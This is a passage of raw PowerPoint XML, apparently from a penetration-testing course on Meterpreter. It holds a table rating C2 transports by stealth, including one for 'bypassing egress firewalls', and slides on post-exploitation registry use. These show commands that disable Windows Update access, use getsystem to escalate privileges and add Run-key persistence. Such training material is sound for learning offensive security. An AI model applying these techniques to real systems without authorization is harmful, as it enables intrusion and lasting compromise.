                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="506132193"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1971675">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3276096390"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1971675">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2927468077"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Transport</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Protocol</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Stealth Level</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Best Use Case</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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757627197"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>TCP</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Raw</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Low</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Fast exfiltration/initial testing</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3018493064"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>HTTP</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Web</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Medium</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Bypassing basic egress firewalls</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841800504"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>HTTPS</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="10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Web+TLS</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High</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General C2, internet-facing traffic</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403904886"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SMB</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Pipe</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Very High</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dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Internal lateral movement/pivoting</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3352356150"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32558993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D6611-99C5-A5D2-C2C2-D8B3CDCDCED7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Interacting with the Windows Registry</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78914B40-AE85-FFE5-BBF1-D0310E20DB9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>In Meterpreter, interacting with the Windows Registry is a powerful post-exploitation capability. It allows you to enumerate configuration settings, modify system </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>behavior</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, or establish persistence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The primary tool for these tasks is the reg command. To view all available sub-commands and options, you can type help reg within your Meterpreter session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35853392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A3A28-CE2F-DDB5-86BB-FA7B9CC2C08C}"/>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08B8CC5-5DE5-2E2A-EEB5-7C2446DC1E9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0CE97AB-7741-3FFB-A414-A6A2128C98B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="936376159"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1061884" y="3873372"/>
          <a:ext cx="6922524" cy="1925957"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" firstCol="1" bandRow="1">
                <a:tableStyleId>{D3BA4600-CF29-4966-8986-3B1AA4679568}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="3461262">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3637784841"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3461262">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="411758630"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="249024">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Command</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Description</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451021052"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="394631">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>reg </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>enumkey</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Lists all subkeys contained within a specified registry key.</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92440059"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="394631">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>reg </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>enumvals</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a:effectLst/>
                        </a:rPr>
                        <a:t>Lists all values contained within a specified registry key.</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427346911"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="249024">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>reg queryval</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200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Retrieves the data and type of a specific registry value.</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4202157428"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E802F54-60D6-C4B9-AD54-F7976F7066E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1061884" y="2753381"/>
            <a:ext cx="7167716" cy="738664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1400" b="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Core Registry Commands</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1050" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The reg command follows a structured syntax. Most commands require you to specify a key (-k) and, for value-related operations, a value name (-v).</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="105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554066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09302-8570-AF33-AB25-52A4C503BC8D}"/>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93857A8E-36AC-79A8-A3E0-174190F20276}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="40000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Key Concepts for Successful Execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. Root Keys and Abbreviations</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>You must reference the correct root hives. Meterpreter accepts both the full name and the standard shorthand: </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>HKEY_LOCAL_MACHINE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (HKLM) </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>HKEY_CURRENT_USER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (HKCU) </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. Escaping Characters</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Because registry paths often contain backslashes and spaces, syntax errors are common. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Backslashes:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Use double backslashes (\\) if your path is problematic, or wrap the key path in single quotes ('...') to ensure it is interpreted correctly.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Spaces:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> If a key name has a space, you must escape the space with a backslash or surround the entire path with single quotes. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> reg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enumkey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> -k 'HKCU\Keyboard Layout'</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>3. Data Types</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>When setting values using reg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>setval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, you must specify the correct type (-t) to ensure the registry interprets the data correctly. Common types include:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>REG_DWORD:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> 32-bit number (use decimal or hex). </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>REG_SZ:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Standard string. </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33478242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D43A4-7D22-89AE-FFC3-85F4E5020A4A}"/>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6F898B9-B13C-E833-E3F6-56950556422E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Listing subkeys in a location:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; reg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enumkey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> -k HKLM\Software\Microsoft\Windows\CurrentVersion\Run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Querying a specific value:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>To see the product name of the operating system:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; reg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>queryval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> -k 'HKLM\Software\Microsoft\Windows NT\CurrentVersion' -v ProductName</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Setting a registry value:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>To set a REG_DWORD value (e.g., modifying a policy):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; reg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>setval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> -k 'HKLM\Software\Policies\Microsoft\Windows\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>WindowsUpdate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>' -v '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>DisableWindowsUpdateAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>' -t REG_DWORD -d 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39473860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64A12-0BDF-D6B8-2297-89E8F014C39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92B104A3-E6B0-19BE-61D9-3C3471B6AB3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Important Considerations</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Permissions:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> You can only interact with registry keys that the current user context has permission to access. If you need to modify HKLM keys, you may need to escalate privileges to SYSTEM first using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>getsystem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> command.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Architecture:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> If you are running an x86 Meterpreter payload on an x64 system, you may encounter registry redirection, where the OS transparently maps registry calls to the Wow6432Node subkey.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Persistence:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A common use of registry interaction is to add a value to the Run or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>RunOnce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> keys to ensure your payload executes automatically every time the target system boots.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26406011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0ABC0-1696-6086-86BF-C1EB51A03872}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>The Meterpreter API</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2514A84D-8F78-EE1B-FF5A-335E0CC71BF3}"/>
              </a:ext>
